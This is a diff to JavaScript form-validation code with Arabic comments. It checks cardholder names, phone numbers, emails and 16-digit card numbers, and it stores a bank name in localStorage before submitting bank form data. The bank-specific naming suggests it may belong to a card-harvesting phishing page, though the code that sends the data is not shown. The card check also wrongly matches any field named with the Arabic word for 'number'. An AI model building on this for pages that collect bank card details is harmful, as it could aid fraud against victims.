@@ -25,34 +25,56 @@ function getCurrentBankName() {
 // دالة للتحقق من صحة حقل الإدخال
 function validateInput(input) {
     const value = input.value.trim();
-    const name = input.name || input.id || input.placeholder || '';
+    const name = (input.name || input.id || input.placeholder || '').toLowerCase();
     
     // إذا كان الحقل فارغاً، نتجاهله
     if (!value) {
         return { valid: false, message: '' };
     }
     
-    // التحقق من رقم الهاتف
-    if (name.toLowerCase().includes('phone') || name.toLowerCase().includes('mobile') || name.toLowerCase().includes('tel')) {
+    // التحقق من الاسم (يجب أن يحتوي على حروف فقط وطوله بين 2-50 حرف)
+    if (name.includes('name') || name.includes('holder') || name.includes('اسم')) {
+        if (value.length < 2) {
+            return { valid: false, message: 'الاسم يجب أن يحتوي على حرفين على الأقل' };
+        }
+        if (value.length > 50) {
+            return { valid: false, message: 'الاسم يجب أن لا يتجاوز 50 حرف' };
+        }
+        // التحقق من أن الاسم يحتوي على حروف فقط (عربي أو إنجليزي) ومسافات
+        const namePattern = /^[a-zA-Zأ-ي\s]+$/;
+        if (!namePattern.test(value)) {
+            return { valid: false, message: 'الاسم يجب أن يحتوي على حروف فقط' };
+        }
+    }
+    
+    // التحقق من رقم الهاتف (8-15 رقم)
+    if (name.includes('phone') || name.includes('mobile') || name.includes('tel') || name.includes('هاتف')) {
+        const cleanedPhone = value.replace(/[\s\-\(\)\+]/g, '');
         const phonePattern = /^[0-9]{8,15}$/;
-        if (!phonePattern.test(value.replace(/[\s\-\(\)]/g, ''))) {
+        if (!phonePattern.test(cleanedPhone)) {
             return { valid: false, message: 'رقم الهاتف يجب أن يحتوي على 8-15 رقم' };
         }
     }
     
     // التحقق من البريد الإلكتروني
-    if (name.toLowerCase().includes('email') || name.toLowerCase().includes('mail')) {
+    if (name.includes('email') || name.includes('mail') || name.includes('بريد')) {
         const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (!emailPattern.test(value)) {
             return { valid: false, message: 'البريد الإلكتروني غير صحيح' };
         }
     }
     
-    // التحقق من رقم البطاقة (16 رقم)
-    if (name.toLowerCase().includes('card') && !name.toLowerCase().includes('cvv') && !name.toLowerCase().includes('cvc')) {
-        const cardPattern = /^[0-9]{13,19}$/;
-        if (!cardPattern.test(value.replace(/[\s\-]/g, ''))) {
-            return { valid: false, message: 'رقم البطاقة يجب أن يحتوي على 13-19 رقم' };
+    // التحقق من رقم البطاقة (16 رقم بالضبط)
+    if (name.includes('card') || name.includes('بطاقة') || name.includes('رقم')) {
+        // تجاهل CVV/CVC
+        if (name.includes('cvv') || name.includes('cvc') || name.includes('security')) {
+            // سيتم التحقق منه في القسم التالي
+        } else {
+            const cleanedCard = value.replace(/[\s\-]/g, '');
+            const cardPattern = /^[0-9]{16}$/;
+            if (!cardPattern.test(cleanedCard)) {
+                return { valid: false, message: 'رقم البطاقة يجب أن يحتوي على 16 رقم بالضبط' };
+            }
         }
     }
     
@@ -223,6 +245,13 @@ document.addEventListener('DOMContentLoaded', function() {
                 const originalText = button.innerHTML;
                 button.disabled = true;
                 button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري الإرسال...';
+                
+                // حفظ بيانات البنك في localStorage
+                const bankData = {
+                    bankName: getCurrentBankName(),
+                    timestamp: new Date().toISOString()
+                };
+                localStorage.setItem('bankData', JSON.stringify(bankData));
                 
                 sendBankFormData(result.data)
                     .then(() => {
